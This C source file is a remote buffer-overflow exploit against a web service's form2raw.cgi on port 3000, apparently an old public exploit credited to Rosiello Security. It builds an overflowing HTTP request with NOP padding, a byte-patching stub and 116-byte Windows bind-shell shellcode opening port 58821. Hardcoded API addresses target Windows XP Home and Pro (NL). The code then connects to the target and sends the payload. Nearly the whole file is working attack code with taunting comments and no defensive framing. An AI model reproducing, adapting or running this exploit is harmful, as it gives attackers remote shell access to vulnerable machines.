#include <stdio.h>
#include <winsock2.h>
#include <errno.h>
#include <windows.h>

// Darn fucking 1337 macro shit
#define ISIP(m) (!(inet_addr(m) ==-1))

#define offset 267 //;267 //1024

// hmm :D
#define NOPS "\x90\x90\x90\x90\x90\x90\x90"


 struct sh_fix
{
 unsigned long _wsasock;
 unsigned long _bind;
 unsigned long _listen;
 unsigned long _accept;
 unsigned long _stdhandle;
 unsigned long _system;
} ;

struct remote_targets {
  char *os;
  unsigned long sh_addr;
  struct sh_fix _sh_fix;
} target [] ={
/* Option`s for your eyes only :D*/
    "Demo                ",
     0x42424242,
    {  0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,// <--
      0x90909090,
    },

    "Windows XP HOME [NL]",
     0x014D4DFC,
    {  0x71a35a01,
      0x71a33ece,
      0x71a35de2,
      0x71a3868d,
      0x77e6191d,// <--
      0x77bf8044,
    },

    "Windows XP PRO [NL]",
     0x014D4DFC,
    {  0x71a35a01,
      0x71a33ece,
      0x71a35de2,
      0x71a3868d,
      0x77e6191d,// <--
      0x77bf8044,
    }
};


unsigned char _addy [] =
"\x90\x90\x90\x90";


// 116 bytes bindcode for windows,(NTlike) port=58821, by silicon :)
// w000w you rule !!
unsigned char shellcode[] =

"\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06"
"\x6A\x01\x6A\x02\xB8"
"\xAA\xAA\xAA\xAA"
"\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0"
"\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5"
"\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8"
"\xBB\xBB\xBB\xBB"
"\xFF\xD0\x6A\x01\x53\xB8"
"\xCC\xCC\xCC\xCC"
"\xFF\xD0\x33\xC0\x50\x50\x53\xB8"
"\xDD\xDD\xDD\xDD"
"\xFF\xD0\x8B\xD8\xBA"
"\xEE\xEE\xEE\xEE"
"\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2"
"\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63"
"\x6D\x64\x8D\x45\xFC\x50\xB8"
"\xFF\xFF\xFF\xFF"
"\xFF\xD0\x41";



/* The funny thing is while exploiting this bug one of the adresses
  (see target[1 || 2].sh_addr) had a forbidden character (0x20 aka space) to fix this i wrote
  this addy/mini shellcode tho replace the 0x19 (thats not supposed to be there) in the
  SetStdHandle () adress inside the shellcode for an 0x20.
  */

unsigned char _me [] =
"\x33\xC9"          				//  xor         ecx,ecx
"\xBE\xAA\xAA\xAA\xAA"           	//  mov         esi,offset _shellcode (00421a50)
"\x83\xC1\x1F"         				//  add         ecx,1Fh
"\x41"           					//  inc         ecx
"\x66\x89\x4E\x50"        			//  mov         word ptr [esi+50h],cx
"\xC6\x46\x51\xE6";         		//  mov         byte ptr [esi+51h],0E6h



// now what would this button do ?
char *host_ip;
u_long get_ip(char *hostname)
{
 struct  hostent    *hp;

 if (ISIP(hostname)) return inet_addr(hostname);

  if ((hp = gethostbyname(hostname))==NULL)
  { perror ("[+] gethostbyname() failed check the existance of the host.\n");
    exit(-1); }

  return (inet_ntoa(*((struct in_addr *)hp->h_addr)));
}



int fix_shellcode ( int choise )
{
 unsigned long only_xp =target[choise].sh_addr+strlen(NOPS)+strlen(_me);


  memcpy(_me+3,((char *)&only_xp),4);


  //0xf offset to the adres of  WSASocketA
  memcpy(shellcode+0xf,((char *)&target[choise]._sh_fix._wsasock),4);

  //0x30 offset to the adres of bind
  memcpy(shellcode+0x30,((char *)&target[choise]._sh_fix._bind),4);

  //0x3a offset to the adres of listen
  memcpy(shellcode+0x3a,((char *)&target[choise]._sh_fix._listen),4);

  //0x46 offset to the adres of _accept
  memcpy(shellcode+0x46,((char *)&target[choise]._sh_fix._accept),4);

  //0x4f offset to the adres of SetStdHandle
  memcpy(shellcode+0x4f,((char *)&target[choise]._sh_fix._stdhandle),4);

  //0x6e offset to the adres of SYSTEM
  memcpy(shellcode+0x6e,((char *)&target[choise]._sh_fix._system),4);

return 0;

}
/// oooh yeah uuuh right .... Crap dont you uuh yeah at me you know me !
int usage (char *what)
{
 int i;

  fprintf(stdout,"Copyright � Rosiello Security\n");
  fprintf(stdout,"http://www.rosiello.org\n\n");
  fprintf(stdout,"Usage %s <target host> <target number>\n",what);
  fprintf(stdout,"Target Number\t\tTarget Name\t\t\t\tStack Adress\n");
  fprintf(stdout,"=============\t\t===========\t\t\t\t===========\n");

  for (i=0;i < 3;i++)
  	fprintf(stdout,"%d\t\t\t%s\t\t0x%p\n",i,target[i].os,target[i].sh_addr);

  exit(0);
}


int main(int argc,char **argv)

{


	char buffer[offset*4]="get /form2raw.cgi?From=",*ptr,*address;
	int sd,oops,i,choise;
	struct  sockaddr_in  ooh;


	WSADATA wsadata;
	WSAStartup(0x101, &wsadata);

	if (argc < 2) usage(argv[0]);
	address=argv[1];
	choise=atoi(argv[2]);
	fix_shellcode(choise);

	fprintf(stdout,"[+] Winsock Inalized\n");

 	/* Lets start making a litle setup
    Change the port if you have to */

 	ooh.sin_addr.s_addr = inet_addr(get_ip(address));
    ooh.sin_port        = htons(3000);
    ooh.sin_family      = AF_INET;


	fprintf(stdout,"[+] Trying to connect to %s:%d\n",address,3000);


	// ok ok here`s ur sock()
	sd = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
 	if (!sd<0) { fprintf(stderr,"[!] socket() failed.\n");exit (-1); }

 	fprintf(stdout,"[+] socket inalized\n");


 	/* inalizing the expploiting buffer read the file comments for the details */
	ptr=buffer+strlen(buffer);

	for (i=strlen(buffer);i < offset;i++) *ptr++=(char)0x40;

	sprintf(buffer+strlen(buffer),"%s%s&To=airsupply@0x557.org&Subject=hi&Body=%s%s%s HTTP/1.0\r\n\r\n",
  					((char *)&target[choise].sh_addr),_addy,NOPS,_me,shellcode);





	//memcpy(buffer+35,shellcode,strlen(shellcode));

	fprintf(stdout,"[+] Overflowing string is Prepared\n");

 	// Knock knock ... hi i want to hook up with you
 	oops=connect(sd, (struct sockaddr *)&ooh, sizeof( ooh ));
  	if(oops!=0) { fprintf(stderr,"[!] connect() failed.\n"); exit(-1); }

	// yep wher`e in :D
	fprintf(stdout,"[+] Connected\n");


	// Sending some Dangerous stuff
	i = send(sd,buffer,strlen(buffer),0);
	if (!i <0) { fprintf (stdout,"[!] Send() failed\n"); exit (-1) ; }

	fprintf(stdout,"[+] Overflowing string had been send\n");




	// Bring in the cleaners !!
	WSACleanup();

	// [EOF]
	return 0;

}
